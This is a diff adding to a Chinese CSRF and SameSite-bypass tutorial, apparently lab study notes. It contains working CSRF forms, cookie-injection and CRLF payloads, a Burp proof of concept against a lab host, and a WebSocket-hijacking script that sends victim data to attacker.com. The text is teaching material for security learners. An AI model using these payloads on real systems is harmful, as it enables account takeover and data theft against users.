@@ -251,7 +251,9 @@ email=pwned@evil-user.net
 
 #### 4. CSRF 令牌绑定到非会话 Cookie
 
-**缺陷：** 应用程序将 CSRF 令牌绑定到 Cookie，但绑定的并非用于跟踪会话的同一 Cookie。这通常发生在应用程序使用两个不同框架时（一个用于会话处理，一个用于 CSRF 保护），且两者未集成在一起：
+**缺陷：** 应用程序将 CSRF 令牌绑定到一个独立的 Cookie（如 `csrfKey`），而非绑定到会话 Cookie（`session`）。验证逻辑是：从请求中取出 `csrfKey` Cookie 的值，根据这个值去查询"哪个令牌是有效的"，然后比对请求参数中的 `csrf` 是否匹配。
+
+关键问题：**`csrfKey` 和 `session` 是两个独立的值，服务器没有检查它们是否属于同一个用户。**
 
 ```
 POST /email/change HTTP/1.1
@@ -263,18 +265,172 @@ Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoS
 csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 ```
 
-**利用方式：** 如果网站包含任何允许攻击者在受害者浏览器中设置 Cookie 的行为，则攻击可行：
-1. 攻击者使用自己的账户登录，获取有效令牌和关联的 Cookie
-2. 利用 Cookie 设置行为将其 Cookie 置入受害者浏览器
-3. 在 CSRF 攻击中将令牌提供给受害者
+这个请求中：
+- `session` Cookie 标识"是谁在操作"——服务器用它来决定修改哪个用户的邮箱
+- `csrfKey` Cookie 标识"令牌属于哪个 CSRF 会话"——服务器用它来查找期望的令牌值
+- `csrf` 参数是实际的令牌值
 
-**注意：** Cookie 设置行为甚至不需要存在于与 CSRF 漏洞相同的 Web 应用程序中。同一 DNS 域名内的任何其他应用程序都可以潜在地被利用来设置目标应用程序的 Cookie。
+服务器的验证逻辑伪代码：
+
+```
+csrfKey = request.cookies["csrfKey"]
+expected_token = tokenStore[csrfKey]        // 根据 csrfKey 查令牌
+if request.params["csrf"] != expected_token:
+    reject()
+// 通过验证，用 session Cookie 确定操作对象
+user = sessionStore[request.cookies["session"]]
+user.email = request.params["email"]
+```
+
+**问题在于：** `tokenStore` 是全局的，不区分用户。攻击者登录后，`tokenStore[攻击者的csrfKey] = 攻击者的令牌`。如果攻击者能把 `csrfKey=攻击者的csrfKey` 植入受害者浏览器，攻击者的令牌就能通过受害者的请求验证。
+
+**为什么会出现这种设计？** 通常发生在两个框架未集成时：框架 A 负责会话管理（生成 `session` Cookie），框架 B 负责 CSRF 保护（生成 `csrfKey` Cookie 并维护令牌映射）。两者各自独立工作，没有人把"这个 csrfKey 属于哪个 session"这条关联建立起来。
+
+---
+
+**利用方式（三步走）：**
+
+**第一步：** 攻击者登录自己的账户，获取：
+- 自己的 session Cookie：`session=attacker-session-abc`
+- 自己的 csrfKey Cookie：`csrfKey=attacker-csrfKey-xyz`
+- 与 csrfKey 关联的有效令牌：`csrf=attacker-token-123`
+
+此时服务器的 `tokenStore` 中记录：`"attacker-csrfKey-xyz" → "attacker-token-123"`
+
+**第二步：** 想办法把 `csrfKey=attacker-csrfKey-xyz` 写入受害者的浏览器。
+
+**第三步：** 诱导受害者访问攻击页面，攻击页面发出请求：
+
+```
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=victim-session-789; csrfKey=attacker-csrfKey-xyz
+                                  ^^^^^^^^^^^^^^^^^^^^^^^^ 攻击者的 csrfKey
+
+csrf=attacker-token-123&email=attacker@evil.com
+     ^^^^^^^^^^^^^^^^^ 攻击者的有效令牌
+```
+
+服务器验证过程：
+1. 读取 `csrfKey=attacker-csrfKey-xyz`
+2. 从 `tokenStore` 查到期望令牌是 `attacker-token-123`
+3. 比对请求中的 `csrf=attacker-token-123` —— 匹配，通过
+4. 读取 `session=victim-session-789`，用**受害者的身份**执行修改邮箱操作
+5. 受害者的邮箱被改为 `attacker@evil.com`
+
+攻击成功。服务器的验证只看"csrfKey 和 csrf 是否匹配"，不关心"这个 csrfKey 是不是这个 session 用户的"。
+
+---
+
+**关键问题：第二步怎么做？（Cookie 设置行为 / Cookie-setting gadget）**
+
+要完成攻击，需要能在受害者浏览器中设置一个 Cookie。这通过"Cookie 设置行为"实现——任何能让你控制受害者浏览器中某个 Cookie 值的功能。以下是一些典型例子：
+
+**例1：URL 参数直接写入 Cookie**
+
+假设站点有一个"主题切换"功能：
+
+```
+https://vulnerable-website.com/theme?color=dark
+```
+
+服务器响应头中包含：
+
+```
+Set-Cookie: theme=dark; Domain=vulnerable-website.com; Path=/
+```
+
+参数值被原样写入 Cookie。但更危险的情况是，参数名也可控——比如：
+
+```
+https://vulnerable-website.com/set-preference?name=csrfKey&value=attacker-csrfKey-xyz
+```
+
+服务器无条件地将 `name=value` 写入 Cookie：
+
+```
+Set-Cookie: csrfKey=attacker-csrfKey-xyz; Domain=vulnerable-website.com; Path=/
+```
+
+那么攻击者只需让受害者访问这个 URL：
+
+```html
+<img src="https://vulnerable-website.com/set-preference?name=csrfKey&value=attacker-csrfKey-xyz">
+```
+
+受害者的浏览器就会种下攻击者的 `csrfKey`。
+
+**例2：CRLF 注入（Header Injection）**
+
+某些应用将用户输入反射到响应头中。如果输入过滤不严，攻击者可以注入换行符来插入任意 Cookie：
+
+```
+https://vulnerable-website.com/search?q=hello%0d%0aSet-Cookie:%20csrfKey=attacker-csrfKey-xyz
+                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                             换行注入，添加自定义响应头
+```
+
+响应变为：
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: search_term=hello
+Set-Cookie: csrfKey=attacker-csrfKey-xyz   ← 攻击者注入的
+```
+
+**例3：同域名下的兄弟应用**
+
+Cookie 设置行为不需要和 CSRF 漏洞在同一个应用中。只要域名相同，Cookie 就能被设置。
+
+例如主站 `vulnerable-website.com` 有 CSRF 漏洞，但同域名下还有一个博客子站 `blog.vulnerable-website.com` 没有漏洞。如果博客子站有一个 Cookie 设置功能可以用来设置 `.vulnerable-website.com` 域的 Cookie，攻击者就能利用它来攻击主站。
+
+---
+
+**完整攻击示例：**
+
+假设场景如下：
+
+- `vulnerable-website.com` — 主应用，有 CSRF 漏洞（令牌绑定到 `csrfKey` Cookie）
+- 主应用有一个"语言偏好"功能，URL 参数直接写入 Cookie
+
+攻击者的攻击页面：
+
+```html
+<html>
+<body>
+    <!-- 第一步：在受害者浏览器中植入攻击者的 csrfKey -->
+    <!-- 利用"语言偏好"功能，将 csrfKey Cookie 设置为攻击者的值 -->
+    <img src="https://vulnerable-website.com/set-lang?lang=en"
+         onerror="document.forms[0].submit()">
+
+    <!-- 第二步：发出 CSRF 攻击请求 -->
+    <!-- 此时受害者浏览器中已有 csrfKey=attacker-csrfKey-xyz -->
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="hidden" name="csrf" value="attacker-token-123">
+    </form>
+</body>
+</html>
+```
+
+**注意：** `set-lang?lang=en` 看起来无害——它只是设置一个语言偏好 Cookie。但如果服务器对 Cookie 名称没有限制（比如使用类似的参数名设置逻辑），攻击者可以请求如下 URL：
+
+```
+https://vulnerable-website.com/set-lang?lang=en%0d%0aSet-Cookie:%20csrfKey=attacker-csrfKey-xyz
+```
+
+或者更直接地，如果功能接受任意 Cookie 名值对。这需要具体漏洞环境，但思路是一致的：找到一个能在受害者浏览器中设置特定 Cookie 值的方法。
+
+**一句话总结：** 服务器的 CSRF 验证是 `csrfKey → csrf` 的映射验证，与 `session` 完全无关。攻击者只要能让受害者浏览器中的 `csrfKey` 指向自己已知令牌的那个值，就能用自己的令牌通过受害者请求的验证。
 
 ---
 
 #### 5. CSRF 令牌在 Cookie 中简单重复（Double Submit）
 
-**缺陷：** 应用程序不在服务器端维护已颁发令牌的记录，而是将每个令牌同时复制在 Cookie 和请求参数中。验证时仅检查请求参数中的令牌值是否与 Cookie 中提交的值匹配。这被称为 CSRF 的"双重提交"（double submit）防御：
+**Double Submit 是什么？**
+
+Double Submit（双重提交）是一种**无状态**的 CSRF 防御方案。服务器不在后端存储任何令牌记录，而是通过"比对"来验证：要求客户端在请求中两次提交同一个令牌值——一次放在 Cookie 中，一次放在请求参数（或自定义头）中。服务器仅检查这两个值是否相等。
 
 ```
 POST /email/change HTTP/1.1
@@ -282,14 +438,100 @@ Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 68
 Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+                                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                                    令牌出现在 Cookie 中
 
 csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     同一个令牌出现在请求参数中
 ```
 
-**绕过方式：** 如果网站包含 Cookie 设置功能，攻击者无需获取自己的有效令牌：
-1. 攻击者自行创造一个令牌（如果应用程序检查格式，则按要求的格式生成）
-2. 利用 Cookie 设置行为将其 Cookie 置入受害者浏览器
-3. 在 CSRF 攻击中将相同的令牌提供给受害者
+服务器的验证逻辑伪代码：
+
+```
+cookie_token = request.cookies["csrf"]
+param_token  = request.params["csrf"]
+
+if cookie_token == param_token:
+    pass   // 验证通过
+else:
+    reject()
+```
+
+**为什么会出现这种设计？**
+
+传统 CSRF 令牌方案需要在服务器端维护一个"令牌 → 用户"的映射表（存储在 session 或数据库中），这对某些架构来说有成本：
+
+| 场景 | 传统方案的问题 | Double Submit 的优势 |
+|------|--------------|---------------------|
+| **无状态 REST API** | 没有服务端 session，令牌无处存储 | 不需要存储，比对即可 |
+| **多服务器部署** | 令牌存储需要共享（数据库/Redis），增加复杂度 | 每个服务器独立验证，无需共享状态 |
+| **单页应用（SPA）** | 表单由 JS 动态生成，服务端难以将令牌嵌入 HTML | SPA 读取 Cookie 中的令牌，写入请求参数即可 |
+
+设计思路：浏览器受同源策略保护——攻击者**无法读取**其他域下的 Cookie。所以如果攻击者不知道 Cookie 中的令牌值，他就无法在请求参数中提供相同的值。两个值不匹配，请求被拒绝。看起来合理。
+
+**但缺陷在哪里？**
+
+同源策略阻止攻击者**读取** Cookie，但**不阻止攻击者写入** Cookie。如果攻击者能在受害者浏览器中设置 `csrf` Cookie 为自己的值，那么他就能在攻击请求中提供相同的值——两个值匹配，验证通过。
+
+服务器只做了一件事：`cookie_token == param_token ?`。它不关心：
+- 这个 Cookie 是谁设置的？（攻击者还是服务器）
+- 这个令牌值是否由服务器生成？（攻击者可以自己编一个）
+- 这个 Cookie 有没有 `Secure` 或 `HttpOnly` 标志？（通常没有，因为 JS 需要读取它来写入请求参数）
+
+**利用流程（三步走）：**
+
+**第一步：** 攻击者自创一个令牌。不需要登录，不需要账号，随便编一个即可。比如：`csrf=hacker-crafted-token-999`。如果服务器检查格式（如要求 32 位十六进制），就按格式编一个。
+
+**第二步：** 找到 Cookie 设置行为，将 `csrf=hacker-crafted-token-999` 植入受害者浏览器。
+
+**第三步：** 在 CSRF 攻击页面中，同时提供相同的令牌值：
+
+```html
+<html>
+<body>
+    <!-- 植入 Cookie：csrf=hacker-crafted-token-999 -->
+    <img src="https://vulnerable-website.com/set-preference?name=csrf&value=hacker-crafted-token-999">
+
+    <!-- 发出攻击请求 -->
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="hidden" name="csrf" value="hacker-crafted-token-999">
+        <script>document.forms[0].submit();</script>
+    </form>
+</body>
+</html>
+```
+
+受害者浏览器发出的请求：
+
+```
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=victim-session-789; csrf=hacker-crafted-token-999
+                                                ^^^^^^^^^^^^^^^^^^^^^^^^
+                                                攻击者植入的 Cookie 值
+
+csrf=hacker-crafted-token-999&email=attacker@evil.com
+     ^^^^^^^^^^^^^^^^^^^^^^^^
+     与 Cookie 中的值一致
+```
+
+服务器比对：Cookie 中的 `csrf` = `hacker-crafted-token-999`，参数中的 `csrf` = `hacker-crafted-token-999`。相等，放行。攻击成功。
+
+**与"绑定到非会话 Cookie"的区别：**
+
+| 维度 | 绑定到非会话 Cookie（第4节） | Double Submit（本节） |
+|------|---------------------------|---------------------|
+| **服务端存储** | 有全局 tokenStore，维护 csrfKey→token 映射 | 无任何存储，仅比对 |
+| **是否需要攻击者账号** | 是。需要用自己账号获取合法令牌 | 否。自己编一个即可 |
+| **Cookie 设置目标** | 植入攻击者的 `csrfKey` | 植入攻击者自创的 `csrf` |
+| **攻击难度** | 中等 | 更低 |
+| **根本缺陷** | csrfKey 与 session 无绑定关系 | 服务器不区分"自己设置的 Cookie"和"攻击者设置的 Cookie" |
+
+**关键洞察：** Double Submit 的安全性建立在"攻击者不知道 Cookie 中的令牌值"这一假设上。但一旦攻击者能**写入** Cookie，他就能"知道"——因为值是他自己选的。服务器信任 Cookie 中的值，而这个值来自不可信的客户端——这是问题的根源。
+
+**关于 Cookie 设置行为：** 与第4节相同——任何能写入 Cookie 的功能都可被利用。详见上一节的例1~例3。
 
 ---
 
@@ -310,6 +552,8 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
 SameSite 是一种浏览器安全机制，用于确定网站的 Cookie 何时包含在来自其他网站的请求中。SameSite Cookie 限制为各种跨站攻击（包括 CSRF、跨站泄露和某些 CORS 利用）提供了部分保护。
 
 自 2021 年起，如果发 Cookie 的网站未明确设置自己的限制级别，Chrome 默认应用 `Lax` SameSite 限制。这是提议的标准，预计其他主流浏览器将来也会采用此行为。
+
+CORS：（跨源资源共享，Cross-Origin Resource Sharing）是一个**由浏览器执行的安全机制**，它允许服务器告诉浏览器：“我同意来自某个外部源的网页，访问我的资源。”它本质上是**对浏览器同源策略的有控制放宽**。
 
 ### 核心概念：Site vs Origin
 
@@ -388,9 +632,198 @@ Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
 
 ### 绕过 SameSite 限制：利用有漏洞的兄弟域名
 
-请求即使跨源（cross-origin），仍然可以是同站（same-site）的。因此必须彻底审计所有可用的攻击面，包括任何兄弟域名。XSS 等能够发起任意二次请求的漏洞可以完全破坏基于 site 的防御，使站点的所有域名暴露于跨站攻击之下。
+请求即使跨源（cross-origin），仍然可以是同站（same-site）的。SameSite Cookie 的限制粒度是"site"，不是"origin"。这意味着同一 site 下的所有子域名共享 Cookie 发送权限——Cookie 会在 `app.example.com` 和 `blog.example.com` 之间互相携带。
 
-此外，如果目标网站支持 WebSocket，该功能可能容易受到跨站 WebSocket 劫持（CSWSH）攻击，这本质上是针对 WebSocket 握手的 CSRF 攻击。
+回顾此前的基础概念：
+
+| 请求来源 | 请求目标 | 同站？ | 同源？ |
+|----------|----------|--------|--------|
+| `https://app.example.com` | `https://intranet.example.com` | **是**（同一 site） | 否（域名不同，origin 不同） |
+
+这个事实的后果是：**如果一个兄弟域名存在任意漏洞（XSS、Cookie 注入等），它就可能被用来攻击同 site 下的所有其他应用。** SameSite Cookie 防御在这种场景下完全失效。
+
+---
+
+#### 攻击场景一：利用兄弟域名的 XSS 发起 CSRF
+
+假设组织拥有以下域名：
+
+- `app.example.com` —— 核心业务应用，所有敏感操作受 SameSite Strict Cookie 保护
+- `blog.example.com` —— 公司博客，存在一个反射型 XSS 漏洞
+
+由于 `blog.example.com` 和 `app.example.com` 同属 `example.com` site：
+- 从 `blog.example.com` 向 `app.example.com` 发起的请求会携带所有 SameSite Cookie
+- 浏览器的 SameSite 机制认为这是"同站"请求，不做限制
+
+攻击链：
+
+1. 攻击者构造一个指向 `blog.example.com` 的链接，在 URL 参数中注入 XSS payload
+2. payload 中的 JavaScript 向 `app.example.com` 发起 CSRF 请求（修改邮箱、转账等）
+3. 浏览器判定请求是同站的，携带受害者在 `app.example.com` 上的会话 Cookie
+4. `app.example.com` 收到请求，Cookie 有效，执行操作
+
+与直接从外部站点发起 CSRF 的关键区别：
+
+| 攻击来源 | SameSite 行为 | 攻击结果 |
+|---------|-------------|---------|
+| 外部站点（`attacker.com`） | 浏览器阻止发送 Cookie（Strict/Lax） | 失败 |
+| 兄弟域名（`blog.example.com`） | 浏览器发送 Cookie（同站） | 成功 |
+
+这解释了为什么"站点"而非"源"的安全边界存在风险——一个子域沦陷，整个 site 的 SameSite 保护就失效了。
+
+---
+
+#### 攻击场景二：跨站 WebSocket 劫持（CSWSH）
+
+如果目标站点支持 WebSocket，同一 site 内的兄弟域名漏洞还可以被用来实施跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking，CSWSH）。这是对 WebSocket 握手的 CSRF 攻击，但后果远比普通 CSRF 严重。
+
+**WebSocket 基础回顾：**
+
+WebSocket 是一种全双工通信协议，允许浏览器和服务器之间建立持久连接，双向发送数据。它通常用于实时功能：聊天、通知推送、协作编辑、交易行情等。
+
+一个典型的 WebSocket 连接建立过程（握手）：
+
+```
+GET /chat HTTP/1.1
+Host: example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://example.com
+Cookie: session=abc123def456
+```
+
+服务器响应：
+
+```
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+```
+
+之后 TCP 连接保持不关闭，两端可以随时互相发送数据帧。
+
+**为什么 WebSocket 容易受到 CSWSH 攻击？**
+
+WebSocket 的握手是一个标准的 HTTP GET 请求，但存在三个区别于普通 HTTP 请求的关键特点：
+
+**特点一：浏览器不在 WebSocket API 上强制同源策略**
+
+普通 HTTP 请求（fetch/XHR）遵循同源策略：从 `attacker.com` 向 `example.com` 发起的跨源请求会被浏览器拦截（除非服务器通过 CORS 头明确允许）。但 WebSocket 不同——`new WebSocket("wss://example.com/chat")` 可以从**任何域**的页面发起，浏览器不拦截。这是 WebSocket 协议的设计特性，目的是允许跨域 WebSocket 连接。
+
+**特点二：握手请求自动携带目标域的 Cookie**
+
+与所有 HTTP 请求一样，浏览器在发送 WebSocket 握手请求时会自动附带目标域名的 Cookie（受 SameSite 限制影响）。如果服务器仅依赖 Cookie 对 WebSocket 连接进行认证，那么——
+
+- 从同站发起的握手（如从 `blog.example.com` 到 `app.example.com`）：Cookie 随请求一起发送
+- 从外部站点发起的握手（如从 `attacker.com` 到 `example.com`）：SameSite=Strict 时阻止发送 Cookie，但 SameSite=Lax/None 时仍会发送
+
+**特点三：CSWSH 是读写型攻击，而非仅写**
+
+这使 CSWSH 比 CSRF 严重得多：
+
+| 维度 | 普通 CSRF | CSWSH |
+|------|----------|-------|
+| **请求方向** | 单向（攻击者发送，不能读响应） | 双向（攻击者既发送也接收） |
+| **连接特性** | 一次性的请求-响应 | 持久连接，可持续交互 |
+| **数据窃取** | 不可能 | 可能——WebSocket 是全双工的 |
+| **攻击范围** | 单个操作（改邮箱、转账） | WebSocket 支持的任何操作，且能读取服务器推送的数据 |
+
+**CSWSH 攻击示例：**
+
+假设 `app.example.com` 有一个 WebSocket 端点 `wss://app.example.com/ws/trading`，用于实时交易。服务器在握手阶段通过 Cookie 验证用户身份，但没有检查 `Origin` 头。
+
+攻击者首先在 `blog.example.com` 上找到一个 XSS（或 Cookie 注入）。由于是兄弟域名，属于同站，瀏览器会将 `app.example.com` 的 Cookie 随握手请求发送。
+
+攻击者在 `blog.example.com` 上注入的恶意 JavaScript：
+
+```javascript
+// 从受害者浏览器建立到目标应用的 WebSocket 连接
+// 因为是同站（blog.example.com → app.example.com），Cookie 被自动携带
+var ws = new WebSocket('wss://app.example.com/ws/trading');
+
+ws.onopen = function() {
+    // 连接建立后，以受害者身份发送交易指令
+    ws.send('{"action": "transfer", "to": "attacker-account", "amount": 10000}');
+    ws.send('{"action": "sell", "symbol": "AAPL", "shares": 500}');
+};
+
+ws.onmessage = function(event) {
+    // 能够读取服务器返回的数据 —— CSRF 做不到这一点
+    // 窃取账户余额、持仓信息、交易历史等敏感数据
+    var img = new Image();
+    img.src = 'https://attacker.com/steal?data=' + encodeURIComponent(event.data);
+};
+
+ws.onerror = function() {
+    // 连接失败，可能服务器检查了 Origin
+};
+```
+
+受害者浏览器的行为：
+
+1. 访问 `blog.example.com`（含有 XSS payload）
+2. XSS payload 执行 `new WebSocket('wss://app.example.com/ws/trading')`
+3. 浏览器发送 WebSocket 握手到 `app.example.com`，携带 `Cookie: session=victim-session`
+4. `app.example.com` 验证 Cookie 有效，返回 101 升级为 WebSocket
+5. 攻击者的脚本现在拥有一个以受害者身份认证的全双工 WebSocket 连接
+6. 攻击者可以发送交易指令，也可以读取服务器返回的所有数据
+
+**CSWSH 与 SameSite 的关系：**
+
+| SameSite 设置 | 来自外部站点的 WebSocket 握手 | 来自兄弟域名的 WebSocket 握手 |
+|--------------|--------------------------|--------------------------|
+| **None** | Cookie 发送（攻击可行） | Cookie 发送（攻击可行） |
+| **Lax** | WebSocket 握手是 GET 请求，但非顶级导航触发——浏览器不发送 Cookie（攻击不可行） | Cookie 发送（攻击可行） |
+| **Strict** | Cookie 不发送（攻击不可行） | Cookie 发送（攻击可行） |
+
+关键结论：**无论 SameSite 设置为何，只要存在一个可被攻击者控制的兄弟域名，Cookie 就会在 WebSocket 握手时被发送。** SameSite 在这种情况下完全不构成障碍。
+
+**服务器端如何防御 CSWSH：**
+
+WebSocket 的握手本质上是一个 HTTP 请求，所以 CSRF 令牌验证同样适用于 WebSocket 握手。常见方式是在连接 URL 中附带令牌作为查询参数：
+
+```
+wss://app.example.com/ws/trading?csrf_token=abc123xyz
+```
+
+服务器在握手阶段验证 `csrf_token` 参数：
+- 验证失败 → 拒绝升级（返回 403）
+- 验证通过 → 建立 WebSocket 连接
+
+但更关键且最简单的防御是验证 `Origin` 头：
+
+```
+GET /ws/trading HTTP/1.1
+Host: app.example.com
+Origin: https://blog.example.com    ← 来自兄弟域名，不是预期来源
+```
+
+服务器的验证策略（按严格程度递增）：
+
+| 策略 | 行为 | 安全性 |
+|------|------|--------|
+| 不检查 Origin | 任何来源的握手都接受 | 危险——完全暴露于 CSWSH |
+| 检查域名字符串包含 | `if origin.contains("example.com")` | 不足——子域名伪造可绕过（如 `example.com.attacker.com`） |
+| 精确匹配白名单 | `if origin === "https://app.example.com"` | 安全——攻击者无法伪造 Origin 头 |
+
+**注意：** `Origin` 头由浏览器设置，攻击者无法通过 JavaScript 伪造其值。但对于非浏览器客户端（如 curl、脚本），Origin 头可以被任意设置——不过这种场景下不存在"跨站"的概念，属于不同的威胁模型。
+
+**CSWSH 攻击总结：**
+
+```
+CSWSH 攻击成立条件
+├── 目标应用使用 WebSocket
+├── 服务器仅通过 Cookie 认证 WebSocket 连接（无 Origin 检查、无令牌验证）
+└── 攻击者能发起跨站请求（外部站点 + SameSite=None/Lax，或兄弟域名 + 任何 SameSite 设置）
+
+攻击效果（比 CSRF 严重）
+├── 读写双向 —— 能窃取 WebSocket 推送的数据
+├── 持久连接 —— 可持续交互，不限于单个操作
+└── 浏览器不拦截 —— WebSocket API 不受同源策略限制
+```
 
 ---
 
@@ -422,37 +855,284 @@ window.onclick = () => {
 
 ---
 
+#### Lab 实战：完整攻击脚本逐行拆解
+
+**攻击目标：** 受害者已登录靶场（通过 OAuth），攻击者要修改受害者的邮箱。靶场 Cookie 设置了 SameSite=Lax，正常情况下跨站 POST 表单无法携带 Cookie。
+
+**攻击成立的关键：** Chrome 在设置 Cookie 后的 120 秒内不强制执行 SameSite 规则，利用这个豁免窗口绕过 Lax 限制。
+
+##### 第一部分：用点击触发的弹窗，刷新 Cookie
+
+```javascript
+window.onclick = () => {
+    window.open('https://.../social-login');
+    // ...
+}
+```
+
+- **为什么用 `window.onclick`：** 浏览器会拦截未经用户交互的弹窗。用点击事件绑定，只要受害者点页面任意位置，弹窗就能成功打开。
+- **为什么是 `/social-login`：** 这是 OAuth 登录接口。受害者点击后，新窗口会走一遍 OAuth 流程，服务端会重新下发一个 Session Cookie。
+- **关键点：** 这个新下发的 Cookie 在 120 秒内不受 SameSite 限制，可以随跨站请求发送。
+
+##### 第二部分：延迟执行表单提交
+
+```javascript
+function a(){document.getElementById('form1').submit();}setTimeout(a,10000);
+```
+
+- **为什么用 `setTimeout` 延迟：** OAuth 跳转需要时间。如果弹窗的同时立刻提交表单，Cookie 可能还没拿到，攻击会失败。延迟 10 秒，给登录流程足够的时间完成。
+- **`document.getElementById('form1').submit()`：** 通过 JS 自动提交页面上的隐藏表单。
+
+##### 第三部分：清理 URL 痕迹
+
+```javascript
+history.pushState('', '', '/');
+```
+
+作用：把当前页面的 URL 替换成 `/`，去掉可疑参数，让受害者看起来只是在一个普通页面，增加隐蔽性。
+
+##### 第四部分：隐藏的 CSRF 表单
+
+```html
+<form id="form1" action="https://.../my-account/change-email" method="POST" >
+    <input type="hidden" name="email" value="babb@bbb" />
+</form>
+```
+
+这是一个不可见的表单，目标地址是修改邮箱的接口。因为是 POST 方式，SameSite=Lax 下跨站 POST 通常不带 Cookie，但因为刚刷新了 Cookie，它还在 120 秒的"豁免窗口"内，所以 Cookie 会被带上。
+
+##### 攻击全流程总结
+
+1. **诱导点击：** 受害者访问恶意页面。页面绑定了 `window.onclick`，等待受害者点击页面（比如为了关闭一个假弹窗）。
+2. **刷新 Cookie（弹窗）：** 一旦点击，JS 打开一个指向 `/social-login` 的小窗口。OAuth 自动完成登录，服务器下发一个全新的 Session Cookie。
+3. **延迟等待：** 主页面同时启动一个 10 秒的定时器，给弹窗足够时间完成 OAuth 并拿到新 Cookie。
+4. **执行 CSRF（表单提交）：** 定时器到点后，JS 自动提交修改邮箱的隐藏表单。因为 Cookie 刚下发不到 10 秒，远在 Chrome 120 秒的豁免期内，Cookie 被携带，服务器确认了受害者的身份，邮箱被成功修改。
+
+##### 攻击成功的关键要素
+
+| 要素 | 作用 | 原理 |
+|------|------|------|
+| **用户交互绑定** | 保证弹窗不被浏览器拦截 | 浏览器默认拦截无用户交互的 `window.open()`，`onclick` 绑定绕过了这个限制 |
+| **定时触发机制** | 点击弹窗保证登录完成，延迟保证 Cookie 到位 | 两者配合利用了 120 秒豁免窗口 |
+| **新 Cookie 下发即无限制** | 刚设置的 Cookie 免于 SameSite 检查 | Chrome 为兼容 SSO 机制，对新 Cookie 有 120 秒的 SameSite 豁免期 |
+
+**攻击精髓：** 让受害者点击页面，然后同时做两件事——弹窗重新登录拿一个"热乎的"Cookie，延迟一会后用这个 Cookie 跨站 POST 修改受害者的邮箱。
+
+---
+
 ## 绕过基于 Referer 的 CSRF 防御
 
-### Referer 验证依赖于头部是否存在
+基于 Referer 的 CSRF 防御依赖三个隐含假设：
 
-**缺陷：** 应用程序在请求中存在 Referer 头时验证，但如果头部被省略则跳过验证。
+| 假设 | 说明 |
+|------|------|
+| **假设1：浏览器一定会发送 Referer** | 服务器认为每个跨站请求都会携带 Referer 头 |
+| **假设2：Referer 中的域名可被可靠验证** | 服务器认为检查 Referer 中的域名就能判断请求来源 |
+| **假设3：Referer 的完整内容均可信** | 服务器认为 Referer 中的路径和查询参数也能用于验证 |
 
-**绕过方式：** 通过在托管 CSRF 攻击的 HTML 页面中使用 META 标签，使浏览器在发出请求时丢弃 Referer 头：
+以下两种绕过方法分别针对这些假设。
+
+### 方法一：让浏览器不发 Referer 头（针对假设1）
+
+**核心思路：** 服务器为了"容错"，可能只在 Referer 头存在时才检查它。如果请求没有 Referer，就直接放行。攻击者要做的就是让浏览器不发这个头。
+
+**正常流程：**
+
+从 `attacker-website.com` 发出一个指向 `vulnerable-website.com` 的请求，浏览器默认带上 `Referer: http://attacker-website.com`。服务器检查来源不匹配，拦截。
+
+**绕过流程：**
+
+攻击者在自己的页面中添加：
 
 ```html
 <meta name="referrer" content="never">
 ```
+需要用head包裹<meta name="referrer" content="never">如下
+```html
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <head>
+    <meta name="referrer" content="never">
+  </head>
+  <body>
+    <form action="https://0a9300da0484603180b849b8004800a0.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="wiener12&#64;normal&#45;user&#46;net" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+```
+
+这告诉浏览器："从此页面发出的所有请求，都不要带 Referer 头。"服务器收到的请求中根本没有 Referer 字段，错误地认为安全，放行。
+
+### 方法二：欺骗 Referer 检查（针对假设2和假设3）
+
+如果服务器强制要求必须有 Referer，但检查逻辑写得有问题，攻击者就可以伪造一个看起来合法的值。
+
+#### 1. 只检查前缀
+
+服务器代码可能类似：
+
+```java
+if (referer.startsWith("http://vulnerable-website.com"))
+```
+
+攻击者注册域名：
+
+```
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+```
+
+该 URL 的开头确实匹配预期前缀，能骗过检查。实际上它是 `attacker-website.com` 的子域名，页面完全由攻击者控制。
+
+#### 2. 只检查是否包含域名
+
+服务器代码可能仅用包含判断：
+
+```java
+if (referer.contains("vulnerable-website.com"))
+```
+
+攻击者在自己的 URL 查询参数中塞入目标域名：
+
+```
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+```
+
+此时 Referer 为 `http://attacker-website.com/csrf-attack?vulnerable-website.com`，确实包含了目标域名，服务器误以为请求来自自身，放行。
+
+#### 补充：查询字符串被浏览器隐藏的问题
+
+第二种方法把目标域名放在查询参数中。但许多浏览器为了隐私，默认会从 Referer 中去掉查询字符串。
+
+解决方案：攻击者在自己的服务器响应中设置：
+
